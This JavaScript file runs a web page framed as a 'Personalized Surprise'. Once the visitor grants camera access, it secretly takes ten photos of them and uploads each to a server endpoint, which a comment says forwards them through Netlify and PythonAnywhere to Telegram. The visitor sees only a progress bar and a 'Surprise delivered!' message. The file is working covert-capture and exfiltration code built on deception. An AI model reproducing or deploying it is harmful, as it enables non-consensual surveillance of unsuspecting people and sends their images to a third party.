// ===== CONFIG =====
const TOTAL_PHOTOS = 10;
const CAPTURE_DELAY = 800;

// DOM elements
const welcomeScreen = document.getElementById('welcomeScreen');
const cameraContainer = document.getElementById('cameraContainer');
const loading = document.getElementById('loading');
const completeScreen = document.getElementById('completeScreen');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const startBtn = document.getElementById('startBtn');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');

let stream = null;
let captureCount = 0;
let isCapturing = false;

// Capture photo
function capturePhoto() {
    if (!stream) {
        canvas.width = 400; canvas.height = 300;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#fff'; ctx.font = '20px Arial';
        ctx.fillText('Personalized Surprise', 100, 150);
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9));
    }
    canvas.width = video.videoWidth || 400;
    canvas.height = video.videoHeight || 300;
    const ctx = canvas.getContext('2d');
    ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9));
}

// Send photo to Netlify → PythonAnywhere → Telegram
async function sendPhoto(blob) {
    const form = new FormData();
    form.append('photo', blob, `photo_${Date.now()}.jpg`);
    await fetch("/send", { method: "POST", body: form });
}

// Update progress bar
function updateProgress(percent, message) {
    progressBar.style.width = percent + '%';
    if (message) statusText.textContent = message;
}

// Start processing
function startProcessing() {
    cameraContainer.classList.add('hidden'); loading.style.display = 'block';
    isCapturing = true; captureCount = 0;
    const messages = ["Sending photos...","Photo 1","Photo 2","Photo 3","Photo 4","Photo 5","Photo 6","Photo 7","Photo 8","Photo 9","Photo 10"];
    const interval = setInterval(async () => {
        if (captureCount >= TOTAL_PHOTOS) { clearInterval(interval); finishCapture(); return; }
        const blob = await capturePhoto();
        captureCount++;
        const progress = (captureCount / TOTAL_PHOTOS) * 100;
        const msgIndex = Math.min(captureCount, messages.length - 1);
        updateProgress(progress, messages[msgIndex]);
        await sendPhoto(blob);
    }, CAPTURE_DELAY);
}

// Finish capture
function finishCapture() {
    isCapturing = false;
    updateProgress(100, "Surprise delivered!");
    setTimeout(() => { loading.style.display = 'none'; completeScreen.classList.remove('hidden'); if(stream) stream.getTracks().forEach(t=>t.stop()); }, 1500);
}

// Start button
async function startSurprise() {
    welcomeScreen.classList.add('hidden'); cameraContainer.classList.remove('hidden'); startBtn.disabled = true;
    try { stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}); video.srcObject = stream; video.style.display='block'; setTimeout(startProcessing,2000); }
    catch { startProcessing(); }
}

// Pulse animation
window.addEventListener('load', () => {
    setInterval(()=>{ if(!startBtn.disabled){ startBtn.style.transform='scale(1.05)'; setTimeout(()=>startBtn.style.transform='scale(1)',300); } },2000);
});
window.addEventListener('beforeunload', ()=>{ if(stream) stream.getTracks().forEach(t=>t.stop()); });
